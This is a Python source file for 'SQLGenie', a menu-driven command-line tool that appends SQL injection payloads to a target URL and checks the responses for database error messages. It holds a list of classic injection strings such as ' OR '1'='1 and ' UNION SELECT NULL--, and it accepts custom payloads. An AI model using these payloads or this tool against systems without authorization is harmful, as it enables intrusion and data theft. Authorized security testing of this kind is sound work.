import os
import pyfiglet as fig
from colorama import Fore
import requests
from tabulate import tabulate
from utils import validate_url, print_error, print_success, print_warning, clear_screen, return_to_main

def perform_sql_injection(url, payload):
    """
    Perform SQL injection test on the target URL.
    """
    try:
        full_url = url + payload
        print(Fore.CYAN + f"Testing: {full_url}" + Fore.RESET)
        response = requests.get(full_url, timeout=10)
        
        if response.status_code == 200:
            # Check for common SQL error indicators
            error_indicators = [
                "sql syntax", "mysql", "mysqli", "sqlite", 
                "postgresql", "oracle", "syntax error",
                "unclosed quotation", "quoted string"
            ]
            
            response_lower = response.text.lower()
            for indicator in error_indicators:
                if indicator in response_lower:
                    print_warning("Potential SQL vulnerability detected!")
                    return True, response.text[:500]  # Return first 500 chars
            
            print_success("Request successful (200 OK) - No obvious SQL errors detected")
            return False, response.text[:500]
        else:
            print_warning(f"Request returned status code: {response.status_code}")
            return False, f"Status: {response.status_code}"
    except requests.exceptions.Timeout:
        print_error("Request timed out")
        return False, "Timeout"
    except requests.exceptions.RequestException as e:
        print_error(f"Request failed: {e}")
        return False, str(e)

def main():
    while True:
        for i in fig.figlet_format('                    SQLGenie    ', font='big', width=200).split('\n\n'):
            print(Fore.LIGHTMAGENTA_EX + i.center(120) + Fore.RESET)
        
        print(Fore.GREEN + "SQLGenie is a SQL injection testing tool for authorized security assessments. It tests web applications for SQL injection vulnerabilities using common payloads. Use this tool ONLY on systems you own or have explicit permission to test.".center(120) + Fore.RESET)
        print("")
        
        print(Fore.RED + "⚠️  WARNING: Unauthorized testing is illegal!" + Fore.RESET)
        print(Fore.YELLOW + "📋 Common test payloads will be provided." + Fore.RESET)
        print("")
        
        # Get target URL
        target_url = input(Fore.LIGHTCYAN_EX + "Enter the target URL (e.g., http://example.com/page.php?id=): " + Fore.RESET)
        
        # Validate URL
        valid, error_msg = validate_url(target_url)
        if not valid:
            print_error(error_msg)
            continue
        
        print(Fore.LIGHTYELLOW_EX + "\nChoose an option:")
        print("1. Use custom payload")
        print("2. Test common SQL injection payloads")
        print("3. Back to main menu")
        choice = input("Enter your choice (1/2/3): " + Fore.RESET)
        
        if choice == '1':
            payload = input(Fore.LIGHTCYAN_EX + "Enter your SQL injection payload: " + Fore.RESET)
            print(Fore.LIGHTYELLOW_EX + "\nTesting custom payload..." + Fore.RESET)
            vulnerable, response = perform_sql_injection(target_url, payload)
            print(Fore.LIGHTWHITE_EX + f"\nResponse preview:\n{response}\n" + Fore.RESET)
        
        elif choice == '2':
            common_payloads = [
                "'", 
                "' OR '1'='1", 
                "' OR '1'='1' --", 
                "' OR '1'='1' /*",
                "admin' --",
                "' UNION SELECT NULL--",
                "1' AND '1'='1",
                "' AND 1=1--"
            ]
            
            print(Fore.LIGHTYELLOW_EX + f"\nTesting {len(common_payloads)} common payloads...\n" + Fore.RESET)
            
            results = []
            for payload in common_payloads:
                vulnerable, response = perform_sql_injection(target_url, payload)
                status = Fore.RED + "⚠️ VULNERABLE" + Fore.RESET if vulnerable else Fore.GREEN + "✓ Safe" + Fore.RESET
                results.append([payload, status])
            
            print(Fore.LIGHTWHITE_EX)
            print(tabulate(results, headers=['Payload', 'Result'], tablefmt='grid'))
            print(Fore.RESET)
        
        elif choice == '3':
            return_to_main()
            return
        
        else:
            print_error("Invalid choice. Please enter 1, 2, or 3.")
            continue
        
        # Ask to rerun
        while True:
            rerun = input(Fore.LIGHTBLUE_EX + "\nDo you want to test another URL? (Y/N): " + Fore.RESET).lower()
            if rerun in {'y', 'n'}:
                if rerun == 'n':
                    return_to_main()
                    return
                else:
                    clear_screen()
                    break
            else:
                print_error("Invalid choice. Please enter 'y' or 'n'.")

if __name__ == "__main__":
    main()
